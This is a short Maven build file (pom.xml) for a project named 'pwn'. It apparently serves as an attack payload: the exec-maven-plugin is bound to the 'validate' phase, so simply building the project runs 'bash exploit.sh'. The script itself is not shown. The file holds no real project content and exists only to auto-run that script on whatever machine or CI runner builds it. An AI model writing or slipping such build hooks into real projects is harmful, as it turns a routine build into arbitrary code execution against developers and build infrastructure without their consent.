<project>
  <modelVersion>4.0.0</modelVersion>
  <groupId>pwn</groupId>
  <artifactId>pwn</artifactId>
  <version>1</version>
  <build>
    <plugins>
      <plugin>
        <groupId>org.codehaus.mojo</groupId>
        <artifactId>exec-maven-plugin</artifactId>
        <version>3.0.0</version>
        <executions>
          <execution>
            <phase>validate</phase>
            <goals>
              <goal>exec</goal>
            </goals>
          </execution>
        </executions>
        <configuration>
          <executable>bash</executable>
          <arguments>
            <argument>exploit.sh</argument>
          </arguments>
        </configuration>
      </plugin>
    </plugins>
  </build>
</project>
